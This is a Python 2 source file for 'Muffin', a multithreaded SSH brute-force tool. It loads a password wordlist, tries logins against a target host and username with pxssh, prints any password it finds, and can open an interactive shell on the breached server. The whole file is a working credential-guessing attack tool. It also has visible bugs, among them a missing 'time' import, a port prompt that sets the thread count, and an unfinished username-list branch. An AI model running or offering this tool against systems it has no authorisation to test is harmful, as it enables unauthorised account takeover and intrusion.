from pexpect import pxssh
from datetime import datetime
import getopt
import sys
import Queue
import platform
import subprocess
import threading


# Version Info
version = str('1.1.0')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# general settings
threads = 1
verbose = False
resume = None
errors = 5
ignore_errors = False

# target settings
host = ''
port = 22
proxy = ''
username = ''
password_file = ''
username_file = ''
password_list = None
shell = False

# commandline options
full_cmd_args = sys.argv
argument_list = full_cmd_args[1:]
unix_options = 'hH:P:f:l:u:t:p:sve:iw'
gnu_options = ['help', 'host=', 'port=', 'password-list=', 'login-list=', 'username=', 'threads=', 'proxy=', 'shell', 'verbose', 'errors=', 'ignore-errors', 'wizard']

# Parse Arguments
try:  
    arguments, values = getopt.getopt(argument_list, unix_options, gnu_options)
# output error, and return with an error code
except getopt.error as err:  
    print (str(err))
    sys.exit(2)

# Prints the Banner
def banner():
    print "\t" + "#"*70
    print "\t# " + bcolors.BOLD + " .___  ___.  __    __   _______  _______  __  .__   __." + bcolors.ENDC + "            #"
    print "\t# " + bcolors.BOLD + " |   \/   | |  |  |  | |   ____||   ____||  | |  \ |  |" + bcolors.ENDC + "            #"
    print "\t# " + bcolors.BOLD + " |  \  /  | |  |  |  | |  |__   |  |__   |  | |   \|  |" + bcolors.ENDC + "            #"
    print "\t# " + bcolors.BOLD + " |  |\/|  | |  |  |  | |   __|  |   __|  |  | |  . `  |" + bcolors.ENDC + "            #"
    print "\t# " + bcolors.BOLD + " |  |  |  | |  `--'  | |  |     |  |     |  | |  |\   |" + bcolors.ENDC + "            #"
    print "\t# " + bcolors.BOLD + " |__|  |__|  \______/  |__|     |__|     |__| |__| \__|" + bcolors.ENDC + "            #"
    print "\t# " + bcolors.BOLD + "                                                       " + bcolors.ENDC + "            #"
    print "\t#\t" + bcolors.WARNING + "Multithreaded SSH Brute Force" + bcolors.ENDC + "                                #"
    print "\t#\t" + bcolors.WARNING + "Version: " + version + bcolors.ENDC + "                                               #" 
    print "\t#                                                                    #"
    print "\t" + "#"*70 + '\n'
                                                               
# Prints Help Screen
def help_screen():
    print '\n\t-h\t--help\t\t\tShows this help schreen'
    print '\t-v\t--verbose\t\tTurn on verbosity'
    print '\r'
    print '\t-H\t--host\t\t\tTarget Host'
    print '\t-P\t--port\t\t\tTarget Port (default 22)'
    print '\r'
    print '\t-l\t--password-list\t\tPath to the password list'
    print '\r'
    print '\t-l\t--login-list\t\tPath to list with usernames'
    print '\t-u\t--username\t\tEnter a username'
    print '\r'
    print '\t-e\t--errors\t\tSet Number of allowed errors before Muffin terminates (default 5)'
    print '\t-i\t--ignore-errors\t\tAll Types of Errors will be ignored'
    print '\r'
    print '\t-t\t--threads\t\tNumber of threads (default 1)'
    #print '\t-p\t--proxy\t\t\tConnect through Proxy Server'
    print '\t-s\t--shell\t\t\tInteractive Prompt'
    print '\r'
    print '\t-w\t--wizard\t\tMuffin will prompt You for required Parameters'
    print '\r'

# Clears Screen
def clear_screen():
    if 'Linux' in platform.system():
        try:
            subprocess.call(['clear'])
        except:
            pass
    elif 'Windows' in platform.system():
        try:
            subprocess.call(['cls'])
        except:
            pass

def prompt_number(flag):
    global threads
    global port
    if flag == 'threads':
        try:
            threads = int(raw_input('\tThreads:\t\t'))
        except:
            print '\tMust be a number!'
            prompt_number('threads')
    elif flag == 'port':
        try:
            threads = int(raw_input('\tPort:\t\t\t'))
        except:
            print '\tMust be a number!'
            prompt_number('port')

def wizard():
    print '\n'
    global host
    host = str(raw_input('\tHost:\t\t\t'))
    prompt_number('port')
    global username
    username = str(raw_input('\tUsername:\t\t'))
    global password_file
    password_file = str(raw_input('\tPassword File:\t\t'))
    prompt_number('threads')
    errors = raw_input('\tIgnore Errors? (y/N):\t')
    global ignore_errors
    if errors == 'n' or errors == 'N' or errors == '':
        pass
    elif errors == 'y' or errors == 'Y':
        ignore_errors = True
    print '\n'
    start = raw_input('\t(S)tart / (R)estart / (E)xit: ')
    if start == 'e' or start == 'E':
        print '\tTerminating...'
        sys.exit(0)
    elif start == 's' or start == 'S' or start == '':
        clear_screen()
    elif start == 'r' or start == 'R':
        wizard()


# Wordlist Builder Class
class WordlistBuilder(object):
    
    # Reads a Wordlist File and returns a Wordlist Queue
    def build_wordlist(self, wordlist_file):
        try:
            fd = open(wordlist_file, 'rb')
            raw_words = fd.readlines()
            fd.close()
        except:
            print '\r[ERROR] Could not open File %s' % wordlist_file
            sys.exit(2)
        found_resume = False
        words = Queue.Queue()
        for word in raw_words:
            word = word.strip()
            if resume is not None:
                if found_resume:
                    words.put(word)
                    
                else:
                    if word == resume:
                        found_resume = True
                        print '\tResuming wordlist from: %s' % resume
            else:
                words.put(word)
        return words

# Bruter Class
class Bruter(object):
    
    def __init__(self, username, host, port, words, errors, ignore_errors, pw_q_size):
        # Username
        self.username = username
        # Port
        self.port = port
        # Wordlist Queue
        self.pw_q = words
        # Queue Size
        self.pw_q_size = pw_q_size
        # Host
        self.host = host
        # Flag that indicates when a login attempt was successfull
        self.success = False
        # Connection Errors
        self.fails = 0
        # Number of allowed Errors befor Program terminates
        self.errors = errors
        # If set to True all errors will be ignored and the Program won't terminate
        self.ignore_errors = ignore_errors
        # Passwords tried
        self.pws_tried = 0
        
    # Connects to SSH Server
    def connect(self, password):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.username, password, terminal_type='ansi', original_prompt='[#$]', port=self.port)
            return s
        except Exception, e:
              
            if self.fails > self.errors and not self.ignore_errors:
                print '\r[ERROR] Too many Socket timeouts...'
                sys.exit(0)
                
            elif 'read_nonblocking' in str(e):
                self.fails += 1
                time.sleep(5)
                return self.connect(password)
            
            elif 'synchronize with original prompt' in str(e):
                time.sleep(1)
                return self.connect(password)
            
            elif 'Could not establish connection to host' in str(e):
                if verbose:
                    print '\r[ERROR] %s' % str(e)
                self.fails += 1
                time.sleep(1)
                return self.connect(password)
        return None

    # The Brute Force function
    def bruteforce(self):
        while not self.pw_q.empty() and not self.success:
            password = str(self.pw_q.get().rstrip())
            self.pws_tried += 1
            if verbose:
                print bcolors.OKGREEN + '\r[%s:%s:%s]' % (datetime.now().strftime('%H'), datetime.now().strftime('%M'), datetime.now().strftime('%S')) + bcolors.ENDC + ' (%d/%d) Password: %s' % (self.pws_tried, self.pw_q_size, password)
            else:
                sys.stdout.write(bcolors.OKGREEN + '\r[%s:%s:%s]' % (datetime.now().strftime('%H'), datetime.now().strftime('%M'), datetime.now().strftime('%S')) + bcolors.ENDC + ' (%i/%i)' %  (self.pws_tried, self.pw_q_size))
                sys.stdout.flush()
            con = self.connect(password)
            if con:
                self.success = True
                if not shell:
                    print '\r[SUCCESS] Password found: %s' % password
                    
                else:
                    print '\r[SUCCESS] Password found: %s' % password
                    print '\r[SSH CONNECT] (q or Q) to exit'
                    command = raw_input('> ')
                    if command is 'q' or command is 'Q':
                        con.logout()
                    while command is not 'q' and command is not 'Q':
                        con.sendline(command)
                        con.prompt()
                        print con.before
                        command = raw_input('> ')

    # Function calls self.bruteforce once for each Thread
    def run_connect(self):
        for i in range(int(threads)):
            t = threading.Thread(target=self.bruteforce)
            t.start()
    
def main():
    # Check for required Parameters
    if host is not '' and username is not '' and password_file is not '' and username_file is '':
        pw_builder = WordlistBuilder()
        password_list = pw_builder.build_wordlist(password_file)
        password_list_size = password_list.qsize()
        bruter_obj = Bruter(username, host, port, password_list, errors, ignore_errors, password_list_size)
        bruter_obj.run_connect()
    elif host is not '' and username is '' and password_file is not '' and username_file is not '':
        pass
        
    elif host is '':
        print bcolors.FAIL + '[ERROR] You have to specify a Host...' + bcolors.ENDC
        sys.exit(2)
        
    elif username is '':
        print bcolors.FAIL + '[ERROR] You have to specify a Username...' + bcolors.ENDC
        sys.exit(2)
        
    elif password_file is '':
        print bcolors.FAIL + '[ERROR] You have to specify a Password File...' + bcolors.ENDC
        sys.exit(2)
        
    else:
        help_screen()
        sys.exit(0)
        
        
if __name__ == '__main__':
    clear_screen()
    banner()
    # Parse Commandline Arguments
    for current_argument, current_value in arguments:
        if current_argument in ('-h', '--help'):
            help_screen()
            sys.exit(0)
        if current_argument in ('-w', '--wizard'):
            wizard()
        if current_argument in ('-H', '--host'):
            host = str(current_value)
        if current_argument in ('-s', '--shell'):
            shell = True
        if current_argument in ('-P', '--port'):
            port = int(current_value)
        if current_argument in ('-t', '--threads'):
            threads = current_value
        if current_argument in ('-v', '--verbose'):
            verbose = True
        if current_argument in ('-f', '--password-list'):
            password_file = str(current_value)
        if current_argument in ('-l', '--username-list'):
            username_file = str(current_value)
        if current_argument in ('-u', '--username'):
            username = str(current_value)
        if current_argument in ('-e', '--errors'):
            errors = int(current_value)
        if current_argument in ('-i', '--ignore-errors'):
            ignore_errors = True
    main()
